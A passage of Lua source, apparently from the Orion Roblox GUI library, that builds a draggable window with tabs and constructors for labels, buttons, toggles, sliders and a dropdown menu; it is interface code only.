	AddConnection(TabHolder.UIListLayout:GetPropertyChangedSignal(""AbsoluteContentSize""), function()
		TabHolder.CanvasSize = UDim2.new(0, 0, 0, TabHolder.UIListLayout.AbsoluteContentSize.Y + 16)
	end)

	local CloseBtn = SetChildren(SetProps(MakeElement(""Button""), {
		Size = UDim2.new(0.5, 0, 1, 0),
		Position = UDim2.new(0.5, 0, 0, 0),
		BackgroundTransparency = 1
	}), {
		AddThemeObject(SetProps(MakeElement(""Image"", ""rbxassetid://7072725342""), {
			Position = UDim2.new(0, 9, 0, 6),
			Size = UDim2.new(0, 18, 0, 18)
		}), ""Text"")
	})

	local MinimizeBtn = SetChildren(SetProps(MakeElement(""Button""), {
		Size = UDim2.new(0.5, 0, 1, 0),
		BackgroundTransparency = 1
	}), {
		AddThemeObject(SetProps(MakeElement(""Image"", ""rbxassetid://7072719338""), {
			Position = UDim2.new(0, 9, 0, 6),
			Size = UDim2.new(0, 18, 0, 18),
			Name = ""Ico""
		}), ""Text"")
	})

	local DragPoint = SetProps(MakeElement(""TFrame""), {
		Size = UDim2.new(1, 0, 0, 50)
	})

	local WindowStuff = AddThemeObject(SetChildren(SetProps(MakeElement(""RoundFrame"", Color3.fromRGB(255, 255, 255), 0, 10), {
		Size = UDim2.new(0, 150, 1, -50),
		Position = UDim2.new(0, 0, 0, 50)
	}), {
		AddThemeObject(SetProps(MakeElement(""Frame""), {
			Size = UDim2.new(1, 0, 0, 10),
			Position = UDim2.new(0, 0, 0, 0)
		}), ""Second""), 
		AddThemeObject(SetProps(MakeElement(""Frame""), {
			Size = UDim2.new(0, 10, 1, 0),
			Position = UDim2.new(1, -10, 0, 0)
		}), ""Second""), 
		AddThemeObject(SetProps(MakeElement(""Frame""), {
			Size = UDim2.new(0, 1, 1, 0),
			Position = UDim2.new(1, -1, 0, 0)
		}), ""Stroke""), 
		TabHolder,
		SetChildren(SetProps(MakeElement(""TFrame""), {
			Size = UDim2.new(1, 0, 0, 50),
			Position = UDim2.new(0, 0, 1, -50)
		}), {
			AddThemeObject(SetProps(MakeElement(""Frame""), {
				Size = UDim2.new(1, 0, 0, 1)
			}), ""Stroke""), 
			AddThemeObject(SetChildren(SetProps(MakeElement(""Frame""), {
				AnchorPoint = Vector2.new(0, 0.5),
				Size = UDim2.new(0, 32, 0, 32),
				Position = UDim2.new(0, 10, 0.5, 0)
			}), {
				SetProps(MakeElement(""Image"", ""https://www.roblox.com/headshot-thumbnail/image?userId="".. LocalPlayer.UserId ..""&width=420&height=420&format=png""), {
					Size = UDim2.new(1, 0, 1, 0)
				}),
				AddThemeObject(SetProps(MakeElement(""Image"", ""rbxassetid://4031889928""), {
					Size = UDim2.new(1, 0, 1, 0),
				}), ""Second""),
				MakeElement(""Corner"", 1)
			}), ""Divider""),
			SetChildren(SetProps(MakeElement(""TFrame""), {
				AnchorPoint = Vector2.new(0, 0.5),
				Size = UDim2.new(0, 32, 0, 32),
				Position = UDim2.new(0, 10, 0.5, 0)
			}), {
				AddThemeObject(MakeElement(""Stroke""), ""Stroke""),
				MakeElement(""Corner"", 1)
			}),
			AddThemeObject(SetProps(MakeElement(""Label"", LocalPlayer.DisplayName, WindowConfig.HidePremium and 14 or 13), {
				Size = UDim2.new(1, -60, 0, 13),
				Position = WindowConfig.HidePremium and UDim2.new(0, 50, 0, 19) or UDim2.new(0, 50, 0, 12),
				Font = Enum.Font.GothamBold,
				ClipsDescendants = true
			}), ""Text""),
			AddThemeObject(SetProps(MakeElement(""Label"", """", 12), {
				Size = UDim2.new(1, -60, 0, 12),
				Position = UDim2.new(0, 50, 1, -25),
				Visible = not WindowConfig.HidePremium
			}), ""TextDark"")
		}),
	}), ""Second"")

	local WindowName = AddThemeObject(SetProps(MakeElement(""Label"", WindowConfig.Name, 14), {
		Size = UDim2.new(1, -30, 2, 0),
		Position = UDim2.new(0, 25, 0, -24),
		Font = Enum.Font.GothamBlack,
		TextSize = 20
	}), ""Text"")

	local WindowTopBarLine = AddThemeObject(SetProps(MakeElement(""Frame""), {
		Size = UDim2.new(1, 0, 0, 1),
		Position = UDim2.new(0, 0, 1, -1)
	}), ""Stroke"")

	local MainWindow = AddThemeObject(SetChildren(SetProps(MakeElement(""RoundFrame"", Color3.fromRGB(255, 255, 255), 0, 10), {
		Parent = Orion,
		Position = UDim2.new(0.5, -307, 0.5, -172),
		Size = UDim2.new(0, 615, 0, 344),
		ClipsDescendants = true
	}), {
		--SetProps(MakeElement(""Image"", ""rbxassetid://3523728077""), {
		--	AnchorPoint = Vector2.new(0.5, 0.5),
		--	Position = UDim2.new(0.5, 0, 0.5, 0),
		--	Size = UDim2.new(1, 80, 1, 320),
		--	ImageColor3 = Color3.fromRGB(33, 33, 33),
		--	ImageTransparency = 0.7
		--}),
		SetChildren(SetProps(MakeElement(""TFrame""), {
			Size = UDim2.new(1, 0, 0, 50),
			Name = ""TopBar""
		}), {
			WindowName,
			WindowTopBarLine,
			AddThemeObject(SetChildren(SetProps(MakeElement(""RoundFrame"", Color3.fromRGB(255, 255, 255), 0, 7), {
				Size = UDim2.new(0, 70, 0, 30),
				Position = UDim2.new(1, -90, 0, 10)
			}), {
				AddThemeObject(MakeElement(""Stroke""), ""Stroke""),
				AddThemeObject(SetProps(MakeElement(""Frame""), {
					Size = UDim2.new(0, 1, 1, 0),
					Position = UDim2.new(0.5, 0, 0, 0)
				}), ""Stroke""), 
				CloseBtn,
				MinimizeBtn
			}), ""Second""), 
		}),
		DragPoint,
		WindowStuff
	}), ""Main"")

	if WindowConfig.ShowIcon then
		WindowName.Position = UDim2.new(0, 50, 0, -24)
		local WindowIcon = SetProps(MakeElement(""Image"", WindowConfig.Icon), {
			Size = UDim2.new(0, 20, 0, 20),
			Position = UDim2.new(0, 25, 0, 15)
		})
		WindowIcon.Parent = MainWindow.TopBar
	end	

	MakeDraggable(DragPoint, MainWindow)

	AddConnection(CloseBtn.MouseButton1Up, function()
		MainWindow.Visible = false
		UIHidden = true
		OrionLib:MakeNotification({
			Name = ""Interface Hidden"",
			Content = ""Tap RightShift to reopen the interface"",
			Time = 5
		})
		WindowConfig.CloseCallback()
	end)

	AddConnection(UserInputService.InputBegan, function(Input)
		if Input.KeyCode == Enum.KeyCode.RightShift and UIHidden then
			MainWindow.Visible = true
		end
	end)

	AddConnection(MinimizeBtn.MouseButton1Up, function()
		if Minimized then
			TweenService:Create(MainWindow, TweenInfo.new(0.5, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {Size = UDim2.new(0, 615, 0, 344)}):Play()
			MinimizeBtn.Ico.Image = ""rbxassetid://7072719338""
			wait(.02)
			MainWindow.ClipsDescendants = false
			WindowStuff.Visible = true
			WindowTopBarLine.Visible = true
		else
			MainWindow.ClipsDescendants = true
			WindowTopBarLine.Visible = false
			MinimizeBtn.Ico.Image = ""rbxassetid://7072720870""

			TweenService:Create(MainWindow, TweenInfo.new(0.5, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {Size = UDim2.new(0, WindowName.TextBounds.X + 140, 0, 50)}):Play()
			wait(0.1)
			WindowStuff.Visible = false	
		end
		Minimized = not Minimized    
	end)

	local function LoadSequence()
		MainWindow.Visible = false
		local LoadSequenceLogo = SetProps(MakeElement(""Image"", WindowConfig.IntroIcon), {
			Parent = Orion,
			AnchorPoint = Vector2.new(0.5, 0.5),
			Position = UDim2.new(0.5, 0, 0.4, 0),
			Size = UDim2.new(0, 28, 0, 28),
			ImageColor3 = Color3.fromRGB(255, 255, 255),
			ImageTransparency = 1
		})

		local LoadSequenceText = SetProps(MakeElement(""Label"", WindowConfig.IntroText, 14), {
			Parent = Orion,
			Size = UDim2.new(1, 0, 1, 0),
			AnchorPoint = Vector2.new(0.5, 0.5),
			Position = UDim2.new(0.5, 19, 0.5, 0),
			TextXAlignment = Enum.TextXAlignment.Center,
			Font = Enum.Font.GothamBold,
			TextTransparency = 1
		})

		TweenService:Create(LoadSequenceLogo, TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {ImageTransparency = 0, Position = UDim2.new(0.5, 0, 0.5, 0)}):Play()
		wait(0.8)
		TweenService:Create(LoadSequenceLogo, TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position = UDim2.new(0.5, -(LoadSequenceText.TextBounds.X/2), 0.5, 0)}):Play()
		wait(0.3)
		TweenService:Create(LoadSequenceText, TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextTransparency = 0}):Play()
		wait(2)
		TweenService:Create(LoadSequenceText, TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextTransparency = 1}):Play()
		MainWindow.Visible = true
		LoadSequenceLogo:Destroy()
		LoadSequenceText:Destroy()
	end 

	if WindowConfig.IntroEnabled then
		LoadSequence()
	end	

	local TabFunction = {}
	function TabFunction:MakeTab(TabConfig)
		TabConfig = TabConfig or {}
		TabConfig.Name = TabConfig.Name or ""Tab""
		TabConfig.Icon = TabConfig.Icon or """"
		TabConfig.PremiumOnly = TabConfig.PremiumOnly or false

		local TabFrame = SetChildren(SetProps(MakeElement(""Button""), {
			Size = UDim2.new(1, 0, 0, 30),
			Parent = TabHolder
		}), {
			AddThemeObject(SetProps(MakeElement(""Image"", TabConfig.Icon), {
				AnchorPoint = Vector2.new(0, 0.5),
				Size = UDim2.new(0, 18, 0, 18),
				Position = UDim2.new(0, 10, 0.5, 0),
				ImageTransparency = 0.4,
				Name = ""Ico""
			}), ""Text""),
			AddThemeObject(SetProps(MakeElement(""Label"", TabConfig.Name, 14), {
				Size = UDim2.new(1, -35, 1, 0),
				Position = UDim2.new(0, 35, 0, 0),
				Font = Enum.Font.GothamSemibold,
				TextTransparency = 0.4,
				Name = ""Title""
			}), ""Text"")
		})

		if GetIcon(TabConfig.Icon) ~= nil then
			TabFrame.Ico.Image = GetIcon(TabConfig.Icon)
		end	

		local Container = AddThemeObject(SetChildren(SetProps(MakeElement(""ScrollFrame"", Color3.fromRGB(255, 255, 255), 5), {
			Size = UDim2.new(1, -150, 1, -50),
			Position = UDim2.new(0, 150, 0, 50),
			Parent = MainWindow,
			Visible = false,
			Name = ""ItemContainer""
		}), {
			MakeElement(""List"", 0, 6),
			MakeElement(""Padding"", 15, 10, 10, 15)
		}), ""Divider"")

		AddConnection(Container.UIListLayout:GetPropertyChangedSignal(""AbsoluteContentSize""), function()
			Container.CanvasSize = UDim2.new(0, 0, 0, Container.UIListLayout.AbsoluteContentSize.Y + 30)
		end)

		if FirstTab then
			FirstTab = false
			TabFrame.Ico.ImageTransparency = 0
			TabFrame.Title.TextTransparency = 0
			TabFrame.Title.Font = Enum.Font.GothamBlack
			Container.Visible = true
		end    

		AddConnection(TabFrame.MouseButton1Click, function()
			for _, Tab in next, TabHolder:GetChildren() do
				if Tab:IsA(""TextButton"") then
					Tab.Title.Font = Enum.Font.GothamSemibold
					TweenService:Create(Tab.Ico, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {ImageTransparency = 0.4}):Play()
					TweenService:Create(Tab.Title, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {TextTransparency = 0.4}):Play()
				end    
			end
			for _, ItemContainer in next, MainWindow:GetChildren() do
				if ItemContainer.Name == ""ItemContainer"" then
					ItemContainer.Visible = false
				end    
			end  
			TweenService:Create(TabFrame.Ico, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {ImageTransparency = 0}):Play()
			TweenService:Create(TabFrame.Title, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {TextTransparency = 0}):Play()
			TabFrame.Title.Font = Enum.Font.GothamBlack
			Container.Visible = true   
		end)

		local function GetElements(ItemParent)
			local ElementFunction = {}
			function ElementFunction:AddLabel(Text)
				local LabelFrame = AddThemeObject(SetChildren(SetProps(MakeElement(""RoundFrame"", Color3.fromRGB(255, 255, 255), 0, 5), {
					Size = UDim2.new(1, 0, 0, 30),
					BackgroundTransparency = 0.7,
					Parent = ItemParent
				}), {
					AddThemeObject(SetProps(MakeElement(""Label"", Text, 15), {
						Size = UDim2.new(1, -12, 1, 0),
						Position = UDim2.new(0, 12, 0, 0),
						Font = Enum.Font.GothamBold,
						Name = ""Content""
					}), ""Text""),
					AddThemeObject(MakeElement(""Stroke""), ""Stroke"")
				}), ""Second"")

				local LabelFunction = {}
				function LabelFunction:Set(ToChange)
					LabelFrame.Content.Text = ToChange
				end
				return LabelFunction
			end
			function ElementFunction:AddParagraph(Text, Content)
				Text = Text or ""Text""
				Content = Content or ""Content""

				local ParagraphFrame = AddThemeObject(SetChildren(SetProps(MakeElement(""RoundFrame"", Color3.fromRGB(255, 255, 255), 0, 5), {
					Size = UDim2.new(1, 0, 0, 30),
					BackgroundTransparency = 0.7,
					Parent = ItemParent
				}), {
					AddThemeObject(SetProps(MakeElement(""Label"", Text, 15), {
						Size = UDim2.new(1, -12, 0, 14),
						Position = UDim2.new(0, 12, 0, 10),
						Font = Enum.Font.GothamBold,
						Name = ""Title""
					}), ""Text""),
					AddThemeObject(SetProps(MakeElement(""Label"", """", 13), {
						Size = UDim2.new(1, -24, 0, 0),
						Position = UDim2.new(0, 12, 0, 26),
						Font = Enum.Font.GothamSemibold,
						Name = ""Content"",
						TextWrapped = true
					}), ""TextDark""),
					AddThemeObject(MakeElement(""Stroke""), ""Stroke"")
				}), ""Second"")

				AddConnection(ParagraphFrame.Content:GetPropertyChangedSignal(""Text""), function()
					ParagraphFrame.Content.Size = UDim2.new(1, -24, 0, ParagraphFrame.Content.TextBounds.Y)
					ParagraphFrame.Size = UDim2.new(1, 0, 0, ParagraphFrame.Content.TextBounds.Y + 35)
				end)

				ParagraphFrame.Content.Text = Content

				local ParagraphFunction = {}
				function ParagraphFunction:Set(ToChange)
					ParagraphFrame.Content.Text = ToChange
				end
				return ParagraphFunction
			end    
			function ElementFunction:AddButton(ButtonConfig)
				ButtonConfig = ButtonConfig or {}
				ButtonConfig.Name = ButtonConfig.Name or ""Button""
				ButtonConfig.Callback = ButtonConfig.Callback or function() end
				ButtonConfig.Icon = ButtonConfig.Icon or ""rbxassetid://3944703587""

				local Button = {}

				local Click = SetProps(MakeElement(""Button""), {
					Size = UDim2.new(1, 0, 1, 0)
				})

				local ButtonFrame = AddThemeObject(SetChildren(SetProps(MakeElement(""RoundFrame"", Color3.fromRGB(255, 255, 255), 0, 5), {
					Size = UDim2.new(1, 0, 0, 33),
					Parent = ItemParent
				}), {
					AddThemeObject(SetProps(MakeElement(""Label"", ButtonConfig.Name, 15), {
						Size = UDim2.new(1, -12, 1, 0),
						Position = UDim2.new(0, 12, 0, 0),
						Font = Enum.Font.GothamBold,
						Name = ""Content""
					}), ""Text""),
					AddThemeObject(SetProps(MakeElement(""Image"", ButtonConfig.Icon), {
						Size = UDim2.new(0, 20, 0, 20),
						Position = UDim2.new(1, -30, 0, 7),
					}), ""TextDark""),
					AddThemeObject(MakeElement(""Stroke""), ""Stroke""),
					Click
				}), ""Second"")

				AddConnection(Click.MouseEnter, function()
					TweenService:Create(ButtonFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(OrionLib.Themes[OrionLib.SelectedTheme].Second.R * 255 + 3, OrionLib.Themes[OrionLib.SelectedTheme].Second.G * 255 + 3, OrionLib.Themes[OrionLib.SelectedTheme].Second.B * 255 + 3)}):Play()
				end)

				AddConnection(Click.MouseLeave, function()
					TweenService:Create(ButtonFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = OrionLib.Themes[OrionLib.SelectedTheme].Second}):Play()
				end)

				AddConnection(Click.MouseButton1Up, function()
					TweenService:Create(ButtonFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(OrionLib.Themes[OrionLib.SelectedTheme].Second.R * 255 + 3, OrionLib.Themes[OrionLib.SelectedTheme].Second.G * 255 + 3, OrionLib.Themes[OrionLib.SelectedTheme].Second.B * 255 + 3)}):Play()
					spawn(function()
						ButtonConfig.Callback()
					end)
				end)

				AddConnection(Click.MouseButton1Down, function()
					TweenService:Create(ButtonFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(OrionLib.Themes[OrionLib.SelectedTheme].Second.R * 255 + 6, OrionLib.Themes[OrionLib.SelectedTheme].Second.G * 255 + 6, OrionLib.Themes[OrionLib.SelectedTheme].Second.B * 255 + 6)}):Play()
				end)

				function Button:Set(ButtonText)
					ButtonFrame.Content.Text = ButtonText
				end	

				return Button
			end    
			function ElementFunction:AddToggle(ToggleConfig)
				ToggleConfig = ToggleConfig or {}
				ToggleConfig.Name = ToggleConfig.Name or ""Toggle""
				ToggleConfig.Default = ToggleConfig.Default or false
				ToggleConfig.Callback = ToggleConfig.Callback or function() end
				ToggleConfig.Color = ToggleConfig.Color or Color3.fromRGB(9, 99, 195)
				ToggleConfig.Flag = ToggleConfig.Flag or nil
				ToggleConfig.Save = ToggleConfig.Save or false

				local Toggle = {Value = ToggleConfig.Default, Save = ToggleConfig.Save}

				local Click = SetProps(MakeElement(""Button""), {
					Size = UDim2.new(1, 0, 1, 0)
				})

				local ToggleBox = SetChildren(SetProps(MakeElement(""RoundFrame"", ToggleConfig.Color, 0, 4), {
					Size = UDim2.new(0, 24, 0, 24),
					Position = UDim2.new(1, -24, 0.5, 0),
					AnchorPoint = Vector2.new(0.5, 0.5)
				}), {
					SetProps(MakeElement(""Stroke""), {
						Color = ToggleConfig.Color,
						Name = ""Stroke"",
						Transparency = 0.5
					}),
					SetProps(MakeElement(""Image"", ""rbxassetid://3944680095""), {
						Size = UDim2.new(0, 20, 0, 20),
						AnchorPoint = Vector2.new(0.5, 0.5),
						Position = UDim2.new(0.5, 0, 0.5, 0),
						ImageColor3 = Color3.fromRGB(255, 255, 255),
						Name = ""Ico""
					}),
				})

				local ToggleFrame = AddThemeObject(SetChildren(SetProps(MakeElement(""RoundFrame"", Color3.fromRGB(255, 255, 255), 0, 5), {
					Size = UDim2.new(1, 0, 0, 38),
					Parent = ItemParent
				}), {
					AddThemeObject(SetProps(MakeElement(""Label"", ToggleConfig.Name, 15), {
						Size = UDim2.new(1, -12, 1, 0),
						Position = UDim2.new(0, 12, 0, 0),
						Font = Enum.Font.GothamBold,
						Name = ""Content""
					}), ""Text""),
					AddThemeObject(MakeElement(""Stroke""), ""Stroke""),
					ToggleBox,
					Click
				}), ""Second"")

				function Toggle:Set(Value)
					Toggle.Value = Value
					TweenService:Create(ToggleBox, TweenInfo.new(0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = Toggle.Value and ToggleConfig.Color or OrionLib.Themes.Default.Divider}):Play()
					TweenService:Create(ToggleBox.Stroke, TweenInfo.new(0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {Color = Toggle.Value and ToggleConfig.Color or OrionLib.Themes.Default.Stroke}):Play()
					TweenService:Create(ToggleBox.Ico, TweenInfo.new(0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {ImageTransparency = Toggle.Value and 0 or 1, Size = Toggle.Value and UDim2.new(0, 20, 0, 20) or UDim2.new(0, 8, 0, 8)}):Play()
					ToggleConfig.Callback(Toggle.Value)
				end    

				Toggle:Set(Toggle.Value)

				AddConnection(Click.MouseEnter, function()
					TweenService:Create(ToggleFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(OrionLib.Themes[OrionLib.SelectedTheme].Second.R * 255 + 3, OrionLib.Themes[OrionLib.SelectedTheme].Second.G * 255 + 3, OrionLib.Themes[OrionLib.SelectedTheme].Second.B * 255 + 3)}):Play()
				end)

				AddConnection(Click.MouseLeave, function()
					TweenService:Create(ToggleFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = OrionLib.Themes[OrionLib.SelectedTheme].Second}):Play()
				end)

				AddConnection(Click.MouseButton1Up, function()
					TweenService:Create(ToggleFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(OrionLib.Themes[OrionLib.SelectedTheme].Second.R * 255 + 3, OrionLib.Themes[OrionLib.SelectedTheme].Second.G * 255 + 3, OrionLib.Themes[OrionLib.SelectedTheme].Second.B * 255 + 3)}):Play()
					SaveCfg(game.GameId)
					Toggle:Set(not Toggle.Value)
				end)

				AddConnection(Click.MouseButton1Down, function()
					TweenService:Create(ToggleFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(OrionLib.Themes[OrionLib.SelectedTheme].Second.R * 255 + 6, OrionLib.Themes[OrionLib.SelectedTheme].Second.G * 255 + 6, OrionLib.Themes[OrionLib.SelectedTheme].Second.B * 255 + 6)}):Play()
				end)

				if ToggleConfig.Flag then
					OrionLib.Flags[ToggleConfig.Flag] = Toggle
				end	
				return Toggle
			end  
			function ElementFunction:AddSlider(SliderConfig)
				SliderConfig = SliderConfig or {}
				SliderConfig.Name = SliderConfig.Name or ""Slider""
				SliderConfig.Min = SliderConfig.Min or 0
				SliderConfig.Max = SliderConfig.Max or 100
				SliderConfig.Increment = SliderConfig.Increment or 1
				SliderConfig.Default = SliderConfig.Default or 50
				SliderConfig.Callback = SliderConfig.Callback or function() end
				SliderConfig.ValueName = SliderConfig.ValueName or """"
				SliderConfig.Color = SliderConfig.Color or Color3.fromRGB(9, 149, 98)
				SliderConfig.Flag = SliderConfig.Flag or nil
				SliderConfig.Save = SliderConfig.Save or false

				local Slider = {Value = SliderConfig.Default, Save = SliderConfig.Save}
				local Dragging = false

				local SliderDrag = SetChildren(SetProps(MakeElement(""RoundFrame"", SliderConfig.Color, 0, 5), {
					Size = UDim2.new(0, 0, 1, 0),
					BackgroundTransparency = 0.3,
					ClipsDescendants = true
				}), {
					AddThemeObject(SetProps(MakeElement(""Label"", ""value"", 13), {
						Size = UDim2.new(1, -12, 0, 14),
						Position = UDim2.new(0, 12, 0, 6),
						Font = Enum.Font.GothamBold,
						Name = ""Value"",
						TextTransparency = 0
					}), ""Text"")
				})

				local SliderBar = SetChildren(SetProps(MakeElement(""RoundFrame"", SliderConfig.Color, 0, 5), {
					Size = UDim2.new(1, -24, 0, 26),
					Position = UDim2.new(0, 12, 0, 30),
					BackgroundTransparency = 0.9
				}), {
					SetProps(MakeElement(""Stroke""), {
						Color = SliderConfig.Color
					}),
					AddThemeObject(SetProps(MakeElement(""Label"", ""value"", 13), {
						Size = UDim2.new(1, -12, 0, 14),
						Position = UDim2.new(0, 12, 0, 6),
						Font = Enum.Font.GothamBold,
						Name = ""Value"",
						TextTransparency = 0.8
					}), ""Text""),
					SliderDrag
				})

				local SliderFrame = AddThemeObject(SetChildren(SetProps(MakeElement(""RoundFrame"", Color3.fromRGB(255, 255, 255), 0, 4), {
					Size = UDim2.new(1, 0, 0, 65),
					Parent = ItemParent
				}), {
					AddThemeObject(SetProps(MakeElement(""Label"", SliderConfig.Name, 15), {
						Size = UDim2.new(1, -12, 0, 14),
						Position = UDim2.new(0, 12, 0, 10),
						Font = Enum.Font.GothamBold,
						Name = ""Content""
					}), ""Text""),
					AddThemeObject(MakeElement(""Stroke""), ""Stroke""),
					SliderBar
				}), ""Second"")

				SliderBar.InputBegan:Connect(function(Input)
					if Input.UserInputType == Enum.UserInputType.MouseButton1 then 
						Dragging = true 
					end 
				end)
				SliderBar.InputEnded:Connect(function(Input) 
					if Input.UserInputType == Enum.UserInputType.MouseButton1 then 
						Dragging = false 
					end 
				end)

				UserInputService.InputChanged:Connect(function(Input)
					if Dragging and Input.UserInputType == Enum.UserInputType.MouseMovement then 
						local SizeScale = math.clamp((Input.Position.X - SliderBar.AbsolutePosition.X) / SliderBar.AbsoluteSize.X, 0, 1)
						Slider:Set(SliderConfig.Min + ((SliderConfig.Max - SliderConfig.Min) * SizeScale)) 
						SaveCfg(game.GameId)
					end
				end)

				function Slider:Set(Value)
					self.Value = math.clamp(Round(Value, SliderConfig.Increment), SliderConfig.Min, SliderConfig.Max)
					TweenService:Create(SliderDrag,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{Size = UDim2.fromScale((self.Value - SliderConfig.Min) / (SliderConfig.Max - SliderConfig.Min), 1)}):Play()
					SliderBar.Value.Text = tostring(self.Value) .. "" "" .. SliderConfig.ValueName
					SliderDrag.Value.Text = tostring(self.Value) .. "" "" .. SliderConfig.ValueName
					SliderConfig.Callback(self.Value)
				end      

				Slider:Set(Slider.Value)
				if SliderConfig.Flag then				
					OrionLib.Flags[SliderConfig.Flag] = Slider
				end
				return Slider
			end  
			function ElementFunction:AddDropdown(DropdownConfig)
				DropdownConfig = DropdownConfig or {}
				DropdownConfig.Name = DropdownConfig.Name or ""Dropdown""
				DropdownConfig.Options = DropdownConfig.Options or {}
				DropdownConfig.Default = DropdownConfig.Default or """"
				DropdownConfig.Callback = DropdownConfig.Callback or function() end
				DropdownConfig.Flag = DropdownConfig.Flag or nil
				DropdownConfig.Save = DropdownConfig.Save or false

				local Dropdown = {Value = DropdownConfig.Default, Options = DropdownConfig.Options, Buttons = {}, Toggled = false, Type = ""Dropdown"", Save = DropdownConfig.Save}
				local MaxElements = 5

				if not table.find(Dropdown.Options, Dropdown.Value) then
					Dropdown.Value = ""...""
				end

				local DropdownList = MakeElement(""List"")

				local DropdownContainer = AddThemeObject(SetProps(SetChildren(MakeElement(""ScrollFrame"", Color3.fromRGB(40, 40, 40), 4), {
					DropdownList
				}), {
					Parent = ItemParent,
					Position = UDim2.new(0, 0, 0, 38),
					Size = UDim2.new(1, 0, 1, -38),
					ClipsDescendants = true
				}), ""Divider"")

				local Click = SetProps(MakeElement(""Button""), {
					Size = UDim2.new(1, 0, 1, 0)
				})

				local DropdownFrame = AddThemeObject(SetChildren(SetProps(MakeElement(""RoundFrame"", Color3.fromRGB(255, 255, 255), 0, 5), {
					Size = UDim2.new(1, 0, 0, 38),
					Parent = ItemParent,
					ClipsDescendants = true
				}), {
					DropdownContainer,
					SetProps(SetChildren(MakeElement(""TFrame""), {
						AddThemeObject(SetProps(MakeElement(""Label"", DropdownConfig.Name, 15), {
							Size = UDim2.new(1, -12, 1, 0),
							Position = UDim2.new(0, 12, 0, 0),
							Font = Enum.Font.GothamBold,
							Name = ""Content""
						}), ""Text""),
						AddThemeObject(SetProps(MakeElement(""Image"", ""rbxassetid://7072706796""), {
							Size = UDim2.new(0, 20, 0, 20),
							AnchorPoint = Vector2.new(0, 0.5),
							Position = UDim2.new(1, -30, 0.5, 0),
							ImageColor3 = Color3.fromRGB(240, 240, 240),
							Name = ""Ico""
						}), ""TextDark""),
						AddThemeObject(SetProps(MakeElement(""Label"", ""Selected"", 13), {
							Size = UDim2.new(1, -40, 1, 0),
							Font = Enum.Font.Gotham,
							Name = ""Selected"",
							TextXAlignment = Enum.TextXAlignment.Right
						}), ""TextDark""),
						AddThemeObject(SetProps(MakeElement(""Frame""), {
							Size = UDim2.new(1, 0, 0, 1),
							Position = UDim2.new(0, 0, 1, -1),
							Name = ""Line"",
							Visible = false
						}), ""Stroke""), 
						Click
					}), {
						Size = UDim2.new(1, 0, 0, 38),
						ClipsDescendants = true,
						Name = ""F""
					}),
					AddThemeObject(MakeElement(""Stroke""), ""Stroke""),
					MakeElement(""Corner"")
				}), ""Second"")

				AddConnection(DropdownList:GetPropertyChangedSignal(""AbsoluteContentSize""), function()
					DropdownContainer.CanvasSize = UDim2.new(0, 0, 0, DropdownList.AbsoluteContentSize.Y)
				end)  

				local function AddOptions(Options)
					for _, Option in pairs(Options) do
						local OptionBtn = AddThemeObject(SetProps(SetChildren(MakeElement(""Button"", Color3.fromRGB(40, 40, 40)), {
							MakeElement(""Corner"", 0, 6),
							AddThemeObject(SetProps(MakeElement(""Label"", Option, 13, 0.4), {
								Position = UDim2.new(0, 8, 0, 0),
								Size = UDim2.new(1, -8, 1, 0),
								Name = ""Title""
							}), ""Text"")
						}), {
							Parent = DropdownContainer,
							Size = UDim2.new(1, 0, 0, 28),
							BackgroundTransparency = 1,
							ClipsDescendants = true
						}), ""Divider"")

						AddConnection(OptionBtn.MouseButton1Click, function()
							Dropdown:Set(Option)
							SaveCfg(game.GameId)
						end)

						Dropdown.Buttons[Option] = OptionBtn
					end
				end	

				function Dropdown:Refresh(Options, Delete)
					if Delete then
						for _,v in pairs(Dropdown.Buttons) do
							v:Destroy()
						end    
						table.clear(Dropdown.Options)
						table.clear(Dropdown.Buttons)
					end
					Dropdown.Options = Options
					AddOptions(Dropdown.Options)
				end  

				function Dropdown:Set(Value)
					if not table.find(Dropdown.Options, Value) then
						Dropdown.Value = ""...""
						DropdownFrame.F.Selected.Text = Dropdown.Value
						for _, v in pairs(Dropdown.Buttons) do
							TweenService:Create(v,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{BackgroundTransparency = 1}):Play()
							TweenService:Create(v.Title,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{TextTransparency = 0.4}):Play()
						end	
						return
					end

					Dropdown.Value = Value
					DropdownFrame.F.Selected.Text = Dropdown.Value

					for _, v in pairs(Dropdown.Buttons) do
						TweenService:Create(v,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{BackgroundTransparency = 1}):Play()
